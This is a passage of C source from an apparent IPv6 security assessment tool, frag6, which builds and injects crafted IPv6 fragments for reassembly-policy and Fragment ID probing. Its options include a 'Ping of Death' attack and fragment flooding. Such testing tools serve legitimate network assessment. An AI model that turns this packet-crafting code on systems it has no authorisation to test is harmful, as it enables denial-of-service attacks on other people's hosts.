	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= srcaddr;
	ipv6->ip6_dst= dstaddr;

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;

	/* Check that we are able to send the Unfragmentable Part, together with a 
	   Fragment Header and a chunk data over our link layer
	 */
	if( (ptr+sizeof(struct ip6_frag)+fsize) > (v6buffer+idata.mtu)){
		puts("Unfragmentable part too large for current MTU");
		return(-1);
	}

	/* We prepare a separete Fragment Header, but we do not include it in the packet to be sent.
	   This Fragment Header will be used (an assembled with the rest of the packet by the 
	   send_packet() function.
	*/
	fh= (struct ip6_frag *) ptr;
	bzero(ptr, FRAG_HDR_SIZE);

	fh->ip6f_ident= htonl(id);

	if(order == LAST_FRAGMENT || order==ATOMIC_FRAGMENT){
		m=0;
	}
	else{
		m=IP6F_MORE_FRAG;
	}

	if(order==FIRST_FRAGMENT || order==ATOMIC_FRAGMENT)
		offset=0;

	fh->ip6f_offlg = (htons(offset) & IP6F_OFF_MASK) | m;

	*prev_nh = IPPROTO_FRAGMENT;
	prev_nh = (unsigned char *) fh;

	ptr+= sizeof(struct ip6_frag);

	*prev_nh = IPPROTO_ICMPV6;


	if(order == FIRST_FRAGMENT || order==ATOMIC_FRAGMENT){
		if((ptr+ sizeof(struct icmp6_hdr)) > (v6buffer+max_packet_size)){
			puts("Packet too large while inserting ICMPv6 header");
			return(-1);
		}

		icmp6 = (struct icmp6_hdr *) ptr;
		icmp6->icmp6_type = ICMP6_ECHO_REQUEST;
		icmp6->icmp6_code = 0;
		icmp6->icmp6_cksum = 0;
		icmp6->icmp6_data16[0]= htons(getpid());	/* Identifier */
		icmp6->icmp6_data16[1]= htons(random());		/* Sequence Number */

		ptr+= sizeof(struct icmp6_hdr);

		for(i=0; i< (fsize/8); i++){
			memcpy(ptr, block, FRAG_BLOCK_SIZE);
			ptr += FRAG_BLOCK_SIZE;
		}

		ptrend=ptr;

		for(i=0; i< (ip6len-sizeof(struct icmp6_hdr)-fsize)/8; i++){
			memcpy(ptr, block, FRAG_BLOCK_SIZE);
			ptr += FRAG_BLOCK_SIZE;
		}

		/* Length of the reassembled fragment */
		ipv6->ip6_plen= htons(ip6len);
		icmp6->icmp6_cksum = in_chksum(v6buffer, icmp6, ptr-((unsigned char *)icmp6), IPPROTO_ICMPV6);

		ptr= ptrend;

		/* Length of the current fragment */
		ipv6->ip6_plen= htons(ptr-(v6buffer + MIN_IPV6_HLEN));
	}
	else{
		if((ptr+ fsize) > (v6buffer+max_packet_size)){
			puts("Packet too large while inserting timestamp");
			return(-1);
		}

		for(i=0; i< (fsize/8); i++){
			memcpy(ptr, block, FRAG_BLOCK_SIZE);
			ptr += FRAG_BLOCK_SIZE;
		}

		ipv6->ip6_plen= htons(ptr-(v6buffer + MIN_IPV6_HLEN));
	}

	if((nw=pcap_inject(idata.pd, buffer, ptr - buffer)) == -1){
		printf("pcap_inject(): %s\n", pcap_geterr(idata.pd));
		return(-1);
	}

	if(nw != (ptr- buffer)){
		printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, (LUI) (ptr-buffer));
		return(-1);
	}

	return 0;
}



/*
 * Function: send_fragment()
 *
 * Sends an IPv6 fragment
 */
int send_fragment(unsigned int id, unsigned int offset, unsigned int fsize, unsigned int forder, unsigned int tstamp_f){
	time_t	tstamp;
	unsigned int i;

	ethernet= (struct ether_header *) buffer;
	dlt_null= (struct dlt_null *) buffer;
	v6buffer = buffer + linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(idata.type == DLT_EN10MB && idata.type != IFACE_LOOPBACK){
		ethernet->src = hsrcaddr;
		ethernet->dst = hdstaddr;
		ethernet->ether_type = htons(0x86dd);
	}
	else if(idata.type == DLT_NULL){
		dlt_null->family= PF_INET6;
	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= srcaddr;
	ipv6->ip6_dst= dstaddr;

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;

	if(hbhopthdr_f){
		hbhopthdrs=0;
	
		while(hbhopthdrs < nhbhopthdr){
			if((ptr+ hbhopthdrlen[hbhopthdrs]) > (v6buffer+ idata.mtu)){
				puts("Packet too large while processing HBH Opt. Header");
				return(-1);
			}
	    
			*prev_nh = IPPROTO_HOPOPTS;
			prev_nh = ptr;
			memcpy(ptr, hbhopthdr[hbhopthdrs], hbhopthdrlen[hbhopthdrs]);
			ptr = ptr + hbhopthdrlen[hbhopthdrs];
			hbhopthdrs++;
		}
	}

	if(dstoptuhdr_f){
		dstoptuhdrs=0;
	
		while(dstoptuhdrs < ndstoptuhdr){
			if((ptr+ dstoptuhdrlen[dstoptuhdrs]) > (v6buffer+ idata.mtu)){
				puts("Packet too large while processing Dest. Opt. Header (Unfrag. Part)");
				return(-1);
			}

			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstoptuhdr[dstoptuhdrs], dstoptuhdrlen[dstoptuhdrs]);
			ptr = ptr + dstoptuhdrlen[dstoptuhdrs];
			dstoptuhdrs++;
		}
	}

	/* Check that we are able to send the Unfragmentable Part, together with a 
	   Fragment Header and a chunk data over our link layer
	 */
	if( (ptr+sizeof(struct ip6_frag)+fsize) > (v6buffer+idata.mtu)){
		puts("Unfragmentable part too large for current MTU (1500 bytes)");
		return(-1);
	}

	/* We prepare a separete Fragment Header, but we do not include it in the packet to be sent.
	   This Fragment Header will be used (an assembled with the rest of the packet by the 
	   send_packet() function.
	*/
	fh= (struct ip6_frag *) ptr;
	bzero(ptr, FRAG_HDR_SIZE);

	fh->ip6f_ident= htonl(id);

	if(forder == LAST_FRAGMENT || forder == ATOMIC_FRAGMENT)
		m=0;
	else
		m=IP6F_MORE_FRAG;

	if((forder==FIRST_FRAGMENT || forder==ATOMIC_FRAGMENT) && !foffset_f)
		offset=0;

	fh->ip6f_offlg = (htons(offset) & IP6F_OFF_MASK) | m;

	*prev_nh = IPPROTO_FRAGMENT;
	prev_nh = (unsigned char *) fh;

	ptr+= sizeof(struct ip6_frag);

	if(dstopthdr_f){
		dstopthdrs=0;
	
		while(dstopthdrs < ndstopthdr){
			if((ptr+ dstopthdrlen[dstopthdrs]) > (v6buffer+max_packet_size)){
				puts("Packet too large while processing Dest. Opt. Header (should be using the Frag. option?)");
				return(-1);
			}
    
			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstopthdr[dstopthdrs], dstopthdrlen[dstopthdrs]);
			ptr = ptr + dstopthdrlen[dstopthdrs];
			dstopthdrs++;
		}
	}

	*prev_nh = IPPROTO_ICMPV6;

	if(forder == FIRST_FRAGMENT || forder == ATOMIC_FRAGMENT){
		if((ptr+ fsize) > (v6buffer+max_packet_size)){
			puts("Packet too large while inserting ICMPv6 header");
			return(-1);
		}

		if(!fsize_f && (forder != LAST_FRAGMENT && forder != ATOMIC_FRAGMENT)){
			fsize= (fsize>>3) << 3;
		}

		if(fsize < sizeof(struct icmp6_hdr)){
			if(verbose_f)
				puts("Fragment size too large to hold an ICMPv6 header");

			return(-1);
		}

		icmp6 = (struct icmp6_hdr *) ptr;
		icmp6->icmp6_type = ICMP6_ECHO_REQUEST;
		icmp6->icmp6_code = 0;
		icmp6->icmp6_cksum = 0;
		icmp6->icmp6_data16[0]= htons(getpid());	/* Identifier */
		icmp6->icmp6_data16[1]= htons(random());		/* Sequence Number */

		ptr+= sizeof(struct icmp6_hdr);
		fsize-= sizeof(struct icmp6_hdr);

		if(tstamp_f && fsize >= (sizeof(time_t)+sizeof(u_int32_t))){
			if((ptr+ (sizeof(time_t) + sizeof(u_int32_t))) > (v6buffer+max_packet_size)){
				puts("Packet too large while inserting timestamp");
				return(-1);
			}

			/* We include a timstamp to be able to measure the Fragment Reassembly timeout */
			tstamp= time(NULL);
			*(time_t *)ptr= tstamp;
			ptr+= sizeof(time_t);

			/* We include a "checksum" such that we can tell the responses we elicit from other packets */
			*(u_int32_t *)ptr= (u_int32_t)tstamp ^ 0xabcdabcd;
			ptr+= sizeof(u_int32_t);
			

			if(fsize > (sizeof(time_t)+sizeof(u_int32_t)))
				fsize-= (sizeof(time_t)+sizeof(u_int32_t));
			else
				fsize=0;
		}

		for(i=0; i< (fsize/4); i++){
			*(u_int32_t *)ptr = random();
			ptr += sizeof(u_int32_t);
		}

		ipv6->ip6_plen= htons(ptr-(v6buffer + MIN_IPV6_HLEN));
		icmp6->icmp6_cksum = in_chksum(v6buffer, icmp6, ptr-((unsigned char *)icmp6), IPPROTO_ICMPV6);
	}
	else{
		if(tstamp_f){
			if((ptr+ (sizeof(time_t) + sizeof(u_int32_t))) > (v6buffer+max_packet_size)){
				puts("Packet too large while inserting timestamp");
				return(-1);
			}

			/* We include a timstamp to be able to measure the Fragment Reassembly timeout */
			tstamp= time(NULL);
			*(time_t *)ptr= tstamp;
			ptr+= sizeof(time_t);

			/* We include a "checksum" such that we can tell the responses we elicit from other packets */
			*(u_int32_t *)ptr= (u_int32_t)tstamp ^ 0xabcdabcd;
			

			if(fsize > (sizeof(time_t)+sizeof(u_int32_t)))
				fsize-= (sizeof(time_t)+sizeof(u_int32_t));
			else
				fsize=0;
		}


		if(!fsize_f && (forder != LAST_FRAGMENT && forder != ATOMIC_FRAGMENT)){
			fsize= (fsize>>3) << 3;
		}

		if((ptr+ (sizeof(time_t) + sizeof(u_int32_t))) > (v6buffer+max_packet_size)){
			puts("Packet too large while inserting timestamp");
			return(-1);
		}

		for(i=0; i<(fsize/4); i++){
			*(u_int32_t *)ptr = random();
			ptr += sizeof(u_int32_t);
		}

		ipv6->ip6_plen= htons(ptr-(v6buffer + MIN_IPV6_HLEN));
	}

	if((nw=pcap_inject(idata.pd, buffer, ptr - buffer)) == -1){
		printf("pcap_inject(): %s\n", pcap_geterr(idata.pd));
		return(-1);
	}

	if(nw != (ptr- buffer)){
		printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, (LUI) (ptr-buffer));
		return(-1);
	}

	return 0;
}


/*
 * Function: send_fid_probe()
 *
 * Send a fragmented ICMPv6 Echo Request used for sampling the Fragment Identification
 * values sent by the target
 */
int send_fid_probe(void){
	unsigned char		fragbuffer[FRAG_BUFFER_SIZE];
	struct ip6_frag		*frag;
	struct ether_header	*ethernet;
	struct ip6_hdr		*ipv6;
	unsigned char		*fptr, *fptrend;
	unsigned int		i;

	ethernet= (struct ether_header *) buffer;
	v6buffer = buffer + linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK){
		ethernet->src = hsrcaddr;
		ethernet->dst = hdstaddr;
		ethernet->ether_type = htons(0x86dd);
	}
	else if(idata.type == DLT_NULL){
		dlt_null->family= PF_INET6;
	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= srcaddr;
	ipv6->ip6_dst= dstaddr;
	ipv6->ip6_nxt= IPPROTO_FRAGMENT;

	/* ptr always points to the part of the original packet that is being crafted */
	ptr = (unsigned char *) v6buffer + sizeof(struct ip6_hdr);

	frag= (struct ip6_frag *) ptr;
	bzero(frag, sizeof(struct ip6_frag));
	frag->ip6f_nxt= IPPROTO_ICMPV6;

	ptr+= sizeof(struct ip6_frag);

	/* fragpart points to the beginning of the fragmentable part of the original packet */
	fragpart= ptr;

	icmp6 = (struct icmp6_hdr *) ptr;
	icmp6->icmp6_type = ICMP6_ECHO_REQUEST;
	icmp6->icmp6_code = 0;
	icmp6->icmp6_cksum = 0;
	icmp6->icmp6_data16[0]= htons(getpid());	/* Identifier */
	icmp6->icmp6_data16[1]= htons(random());	/* Sequence Number */

	ptr+= sizeof(struct icmp6_hdr);
	*(u_int32_t *)ptr= icmp6_sig;
	ptr+= sizeof(u_int32_t);

	for(i=0;i<400; i++){
		*(u_int32_t *)ptr= random();
		ptr+=sizeof(u_int32_t);
	}

	icmp6->icmp6_cksum = in_chksum(v6buffer, icmp6, ptr-(unsigned char *)icmp6, IPPROTO_ICMPV6);

	/* ptrend points to the end of the original packet */
	ptrend= ptr;
	ptr= fragpart;

	/* fptr points to the part of the fragment that is being crafted */
	fptr = fragbuffer;
	fipv6 = (struct ip6_hdr *) (fragbuffer + linkhsize);
	fptrend = fptr + FRAG_BUFFER_SIZE;

	/* Copy everything from the Ethernet header, up to (and including) the Fragmentation Header */
	memcpy(fptr, buffer, fragpart-buffer);
	fptr = fptr + (fragpart-buffer);

	fh= (struct ip6_frag *) (fragbuffer + linkhsize + sizeof(struct ip6_hdr));
	fh->ip6f_ident=random();
	startoffragment = fptr;

	/* We'll be sending packets of at most 1280 bytes (the IPv6 minimum MTU) */
	fragsize= ((MIN_IPV6_MTU - sizeof(struct ip6_hdr) - sizeof(struct ip6_frag)) >> 3) << 3;

	/*
	 * Check that the selected fragment size is not larger than the largest 
	 * fragment size that can be sent. This chec will always be passed, but is useful
	 * when future versions of the tool support other link-layer technologies.
	 */

	if( (startoffragment + fragsize) > fptrend){
		printf("Fragment size too large to fit into fragmentation buffer\n");
		return(-1);
	}

	m=IP6F_MORE_FRAG;

	while((ptr< ptrend) && m==IP6F_MORE_FRAG){
		fptr= startoffragment;

		if( (ptrend-ptr) <= fragsize){
			fragsize= ptrend-ptr;
			m=0;
		}

		memcpy(fptr, ptr, fragsize);
		fh->ip6f_offlg = (htons(ptr-fragpart) & IP6F_OFF_MASK) | m;
		ptr+=fragsize;
		fptr+=fragsize;

		fipv6->ip6_plen = htons((fptr - fragbuffer) - MIN_IPV6_HLEN - linkhsize);
		
		if((nw=pcap_inject(idata.pd, fragbuffer, fptr - fragbuffer)) == -1){
			printf("pcap_inject(): %s\n", pcap_geterr(idata.pd));
			return(-1);
		}

		if(nw != (fptr- fragbuffer)){
			printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", \
												(LUI) nw, (LUI) (ptr-buffer));
			return(-1);
		}
	} /* Sending fragments */

	return(0);
}


/*
 * Function: usage()
 *
 * Prints the syntax of the frag6 tool
 */
void usage(void){
	puts("usage: frag6 -i INTERFACE -d DST_ADDR [-S LINK_SRC_ADDR] [-D LINK-DST-ADDR]\n"
	     "       [-s SRC_ADDR[/LEN]] [-A HOP_LIMIT] [-u DST_OPT_HDR_SIZE]\n"
	     "       [-U DST_OPT_U_HDR_SIZE] [-H HBH_OPT_HDR_SIZE] [-P FRAG_SIZE]\n"
	     "       [-O FRAG_TYPE] [-o FRAG_OFFSET] [-I FRAG_ID] [-T] [-n]\n"
	     "       [-p | -W | -X | -F N_FRAGS] [-l] [-z SECONDS] [-v] [-h]");
}


/*
 * Function: print_help()
 *
 * Prints help information for the frag6 tool
 */
void print_help(void){
	puts(SI6_TOOLKIT);
	puts( "frag6: A security assessment tool for attack vectors based on IPv6 fragments\n");
	usage();
    
	puts("\nOPTIONS:\n"
	     "  --interface, -i           Network interface\n"
	     "  --link-src-address, -S    Link-layer Destination Address\n"
	     "  --link-dst-address, -D    Link-layer Source Address\n"
	     "  --src-address, -s         IPv6 Source Address\n"
	     "  --dst-address, -d         IPv6 Destination Address\n"
	     "  --hop-limit, -A           IPv6 Hop Limit\n"
	     "  --dst-opt-hdr, -u         Destination Options Header (Fragmentable Part)\n"
	     "  --dst-opt-u-hdr, -U       Destination Options Header (Unfragmentable Part)\n"
	     "  --hbh-opt-hdr, -H         Hop by Hop Options Header\n"
	     "  --frag-size, -P           IPv6 fragment payload size\n"
	     "  --frag-type, -O           IPv6 Fragment Type {first, last, middle, atomic}\n"
	     "  --frag-offset, -o         IPv6 Fragment Offset\n"
	     "  --frag-id, -I             IPv6 Fragment Identification\n"
	     "  --no-timestamp, -T        Do not include a timestamp in the payload\n"
	     "  --no-responses, -n        Do not print responses to transmitted packets\n"
	     "  --frag-reass-policy, -p   Assess fragment reassembly policy\n"
	     "  --frag-id-policy, -W      Assess the Fragment ID generation policy\n"
	     "  --pod-attack, -X          Perform a 'Ping of Death' attack\n"
	     "  --flood-frags, -F         Flood target with IPv6 fragments\n"
	     "  --loop, -l                Send IPv6 fragments periodically\n"
	     "  --sleep, -z               Pause between sending IPv6 fragments\n"
	     "  --verbose, -v             Be verbose\n"
	     "  --help, -h                Print help for the frag6 tool\n"
	     "\n"
	     "Programmed by Fernando Gont for SI6 Networks (http://www.si6networks.com)\n"
	     "Please send any bug reports to <fgont@si6networks.com>\n"
	);
}


/* 
 * Function: in_chksum()
 *
 * Calculate the 16-bit ICMPv6 checksum
 */

u_int16_t in_chksum(void *ptr_ipv6, void *ptr_icmpv6, size_t len, u_int8_t proto){
	struct ipv6pseudohdr pseudohdr;
	struct ip6_hdr *v6packet;
	size_t nleft;
	unsigned int sum = 0;
	u_int16_t *w;
	u_int16_t answer = 0;

	v6packet=ptr_ipv6;
	
	bzero(&pseudohdr, sizeof(struct ipv6pseudohdr));
	pseudohdr.srcaddr= v6packet->ip6_src;
	pseudohdr.dstaddr= v6packet->ip6_dst;
	pseudohdr.len = htons(len);
	pseudohdr.nh = proto;

	nleft=40;
	w= (u_int16_t *) &pseudohdr;

	while(nleft > 1){
		sum += *w++;
		nleft -= 2;
	}

	nleft= len;
	w= (u_int16_t *) ptr_icmpv6;

	while(nleft > 1){
		sum += *w++;
		nleft -= 2;
	}

	if(nleft == 1){
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer);
}




/*
 * Function: print_attack_info()
 *
 * Prints attack details (when the verbose ("-v") option is specified).
 */
 
void print_attack_info(void){
	if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK){
		if(ether_ntop(&hsrcaddr, plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Ethernet Source Address: %s%s\n", plinkaddr, (!hsrcaddr_f)?" (automatically selected)":"");

		/* 
		   Ethernet Destination Address only used if a IPv6 Destination Address or an
		   Ethernet Destination Address were specified.
		 */
		if(ether_ntop(&hdstaddr, plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Ethernet Destination Address: %s%s\n", plinkaddr, (!hdstaddr_f)?" (automatically selected)":"");
	}

	if(inet_ntop(AF_INET6, &srcaddr, psrcaddr, sizeof(psrcaddr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	if(dstaddr_f){
		printf("IPv6 Source Address: %s%s\n", psrcaddr, ((!srcaddr_f)?" (automatically selected)":""));
	}

	if(inet_ntop(AF_INET6, &dstaddr, pdstaddr, sizeof(pdstaddr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Destination Address to presentation format");
		exit(EXIT_FAILURE);
	}

	printf("IPv6 Destination Address: %s\n", pdstaddr);

	printf("IPv6 Hop Limit: %u%s\n", hoplimit, (hoplimit_f)?"":" (randomized)");

	for(i=0; i<ndstoptuhdr; i++)
		printf("Destination Options Header (Unfragmentable part): %u bytes\n", dstoptuhdrlen[i]);

	for(i=0; i<nhbhopthdr; i++)
		printf("Hop by Hop Options Header: %u bytes\n", hbhopthdrlen[i]);

	for(i=0; i<ndstopthdr; i++)
		printf("Destination Options Header: %u bytes\n", dstopthdrlen[i]);
}


/*
 * Function: ether_pton()
 *
 * Convert a string (printable Ethernet Address) into binary format
 */

int ether_pton(const char *ascii, struct ether_addr *etheraddr, unsigned int s){
	unsigned int i, a[6];

	if(s < ETHER_ADDR_LEN)
		return 0;
	
	if(ascii){
		if( sscanf(ascii,"%x:%x:%x:%x:%x:%x", &a[0], &a[1], &a[2], &a[3], &a[4], &a[5]) == 6){ 
			for(i=0;i<6;i++)
				etheraddr->a[i]= a[i];

			return 1;
		}
	}

	return 0;
}



/*
 * Function: ether_ntop()
 *
 * Convert binary Ethernet Address into printable foramt (an ASCII string)
 */

int ether_ntop(const struct ether_addr *ether, char *ascii, size_t s){
	unsigned int r;

	if(s < ETHER_ADDR_PLEN)
		return 0;

	r=snprintf(ascii, s, "%02x:%02x:%02x:%02x:%02x:%02x", ether->a[0], ether->a[1], ether->a[2], ether->a[3], \
											ether->a[4], ether->a[5]);

	if(r != 17)
		return 0;

	return 1;
}


/*
 * Function match_ipv6()
 *
 * Finds if an IPv6 address matches a prefix in a list of prefixes.
 */

unsigned int match_ipv6(struct in6_addr *prefixlist, u_int8_t *prefixlen, unsigned int nprefix, 
								struct in6_addr *ipv6addr){

	unsigned int 	i;
	struct in6_addr	dummyipv6;
    
	for(i=0; i<nprefix; i++){
		dummyipv6 = *ipv6addr;
		sanitize_ipv6_prefix(&dummyipv6, prefixlen[i]);
	
		for(j=0; j<4; j++)
			if(dummyipv6.s6_addr32[j] != prefixlist[i].s6_addr32[j])
				break;

		if(j==4)
			return 1;
	}

	return 0;
}


/*
 * match_ether()
 *
 * Finds if an Ethernet address matches any of the Ethernet addreses contained in an array.
 */

unsigned int match_ether(struct ether_addr *addrlist, unsigned int naddr, \
							    struct ether_addr *linkaddr){

	unsigned int i, j;

	for(i=0; i<naddr; i++){
		for(j=0; j<6; j++)
			if(linkaddr->a[j] != addrlist[i].a[j])
				break;

		if(j==6)
			return 1;
	}

	return 0;
}


/*
 * sanitize_ipv6_prefix()
 *
 * Clears those bits in an IPv6 address that are not within a prefix length.
 */

void sanitize_ipv6_prefix(struct in6_addr *ipv6addr, u_int8_t prefixlen){
	unsigned int	skip, i;
	u_int16_t	mask;

	skip= (prefixlen+15)/16;

	if(prefixlen%16){
		mask=0;
		for(i=0; i<(prefixlen%16); i++)
			mask= (mask>>1) | 0x8000;
	    
		ipv6addr->s6_addr16[skip-1]= ipv6addr->s6_addr16[skip-1] & htons(mask);
	}
			
	for(i=skip;i<8;i++)
		ipv6addr->s6_addr16[i]=0;
}


/*
 * randomize_ipv6_addr()
 *
 * Select a random IPv6 from a given prefix.
 */

void randomize_ipv6_addr(struct in6_addr *ipv6addr, struct in6_addr *prefix, u_int8_t preflen){
	u_int16_t mask;
	u_int8_t startrand;	
	unsigned int i;

	startrand= preflen/16;

	for(i=0; i<startrand; i++)
		ipv6addr->s6_addr16[i]= 0;

	for(i=startrand; i<8; i++)
		ipv6addr->s6_addr16[i]=random();

	if(preflen%16){
		mask=0xffff;

		for(i=0; i<(preflen%16); i++)
			mask= mask>>1;

		ipv6addr->s6_addr16[startrand]= ipv6addr->s6_addr16[startrand] & htons(mask);
	}

	for(i=0; i<=(preflen/16); i++)
		ipv6addr->s6_addr16[i]= ipv6addr->s6_addr16[i] | prefix->s6_addr16[i];

}



/*
 * randomize_ether_addr()
 *
 * Select a random Ethernet address.
 */

void randomize_ether_addr(struct ether_addr *ethaddr){
	for(i=0; i<6; i++)
		ethaddr->a[i]= random();

	ethaddr->a[0]= (ethaddr->a[0] & 0xfc) | 0x02;
}


/*
 * Function: inset_pad_opt()
 *
 * Insert a padding option (Pad1 or PadN) into an IPv6 extension header
 */

int insert_pad_opt(unsigned char *ptrhdr, const unsigned char *ptrhdrend, unsigned int padn){
	unsigned char *ptr;

	if( (ptrhdrend - ptrhdr) < padn)
		return 0;

	if(padn == 1){
		*ptrhdr= 0x00;
		return 1;
	}
	else{
		ptr=ptrhdr;
		*ptr= 0x01;
		ptr++;
		*ptr= padn-2;
		ptr+=2;
	
		while(ptr < (ptrhdr+padn)){
			*ptr= 0x00;
			ptr++;
		}    
		return 1;
	}
}


/*
 * Function: ipv6_to_ether()
 *
 * Obtains the Ethernet address corresponding to an IPv6 address (by means of Neighbor Discovery)
 */

int ipv6_to_ether(pcap_t *pfd, struct iface_data *idata, struct in6_addr *targetaddr, struct ether_addr *result_ether){
	struct bpf_program		pcap_filter;
	struct pcap_pkthdr		*pkthdr;
	const u_char			*pktdata;
	struct ip6_hdr			*pkt_ipv6;
	struct nd_neighbor_advert 	*pkt_na;
	unsigned char			*pkt_end;
	volatile unsigned char	*ptr, *p;

	unsigned char			buffer[65556];
	unsigned int 			ns_max_packet_size;
	struct ether_header		*ether;
	unsigned char 			*v6buffer;
	struct ip6_hdr			*ipv6;
	struct nd_neighbor_solicit	*ns;
	struct nd_opt_slla		*sllaopt;
	volatile unsigned int		tries=0;
	unsigned int			foundaddr=0;
	struct sigaction		new_sig, old_sig;
	int				result;
	unsigned char			error_f=0, closefd_f=0;

	ns_max_packet_size = idata->mtu;

	ether = (struct ether_header *) buffer;
	v6buffer = buffer + sizeof(struct ether_header);
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(pfd == NULL){
		if( (pfd= pcap_open_live(idata->iface, PCAP_SNAP_LEN, PCAP_PROMISC, PCAP_TIMEOUT, errbuf)) == NULL){
			if(verbose_f>1)
				printf("pcap_open_live(): %s\n", errbuf);

			return(-1);
		}

		if( pcap_datalink(pfd) != DLT_EN10MB){
			if(verbose_f>1)
				printf("Error: Interface %s is not an Ethernet interface", iface);

			return(-1);
		}

		closefd_f=1;
	}

	if(pcap_compile(pfd, &pcap_filter, PCAP_ICMPV6_NA_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
		if(verbose_f>1)
			printf("pcap_compile(): %s", pcap_geterr(pfd));

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}
    
	if(pcap_setfilter(pfd, &pcap_filter) == -1){
		if(verbose_f>1)
			printf("pcap_setfilter(): %s", pcap_geterr(pfd));

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	pcap_freecode(&pcap_filter);

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= 255;
	ipv6->ip6_src= idata->ip6_local;
	ipv6->ip6_dst= solicited_node(targetaddr);

	ether->src = idata->ether;
	ether->dst = ether_multicast(&(ipv6->ip6_dst));
	ether->ether_type = htons(0x86dd);

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);
	*prev_nh = IPPROTO_ICMPV6;

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;

	if( (ptr+sizeof(struct nd_neighbor_solicit)) > (v6buffer+ns_max_packet_size)){
		if(verbose_f>1)
			puts("Packet too large while inserting Neighbor Solicitation header");

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	ns= (struct nd_neighbor_solicit *) (ptr);

	ns->nd_ns_type = ND_NEIGHBOR_SOLICIT;
	ns->nd_ns_code = 0;
	ns->nd_ns_reserved = 0;
	ns->nd_ns_target = *targetaddr;

	ptr += sizeof(struct nd_neighbor_solicit);
	sllaopt = (struct nd_opt_slla *) ptr;    

	if( (ptr+sizeof(struct nd_opt_slla)) > (v6buffer+ns_max_packet_size)){
		if(verbose_f>1)
			puts("NS message too large while processing source link-layer addresss opt.");

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	sllaopt->type= ND_OPT_SOURCE_LINKADDR;
	sllaopt->length= SLLA_OPT_LEN;
	bcopy( &(idata->ether.a), sllaopt->address, ETH_ALEN);
	ptr += sizeof(struct nd_opt_slla);

	ipv6->ip6_plen = htons((ptr - v6buffer) - MIN_IPV6_HLEN);
	ns->nd_ns_cksum = 0;
	ns->nd_ns_cksum = in_chksum(v6buffer, ns, ptr-((unsigned char *)ns), IPPROTO_ICMPV6);

	/* We set the signal handler, and the anchor for siglongjump() */
	canjump=0;
	bzero(&new_sig, sizeof(struct sigaction));
	sigemptyset(&new_sig.sa_mask);
	new_sig.sa_handler= &sig_alarm;

	alarm(0);

	if( sigaction(SIGALRM, &new_sig, &old_sig) == -1){
		if(verbose_f>1)
			puts("Error setting up 'Alarm' signal");

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	if(sigsetjmp(env, 1) != 0)
		tries++;

	canjump=1;

	while(tries<3 && !foundaddr && !error_f){
		if((nw=pcap_inject(pfd, buffer, ptr - buffer)) == -1){
			if(verbose_f>1)
				printf("pcap_inject(): %s\n", pcap_geterr(pfd));

			error_f=1;
			break;
		}

		if(nw != (ptr-buffer)){
			if(verbose_f>1)
				printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, \
												(LUI) (ptr-buffer));
			error_f=1;
			break;
		}

		alarm(idata->local_timeout);
		
		while(!foundaddr && !error_f){
			do{
				if( (result=pcap_next_ex(pfd, &pkthdr, &pktdata)) == -1){
					if(verbose_f>1)
						printf("pcap_next_ex(): %s", pcap_geterr(pfd));

					error_f=1;
					break;
				}
			}while(result==0);			

			if(error_f)
				break;	

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + ETHER_HDR_LEN);
			pkt_na = (struct nd_neighbor_advert *) ((char *) pkt_ipv6 + MIN_IPV6_HLEN);
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

			/* The packet length is the minimum of what we capured, and what is specified in the
			   IPv6 Total Lenght field
			 */
			if( pkt_end > ((unsigned char *)pkt_na+ pkt_ipv6->ip6_plen) )
				pkt_end = (unsigned char *)pkt_na + pkt_ipv6->ip6_plen;

			/*
			   Discard the packet if it is not of the minimum size to contain a Neighbor Advertisement
			   message with a source link-layer address option
			 */
			if( (pkt_end - (unsigned char *) pkt_na) < (sizeof(struct nd_neighbor_advert) + \
										sizeof(struct nd_opt_tlla)))
				continue;

			/*
			   Neighbor Discovery packets must have a Hop Limit of 255
			 */
			if(pkt_ipv6->ip6_hlim != 255)
				continue;

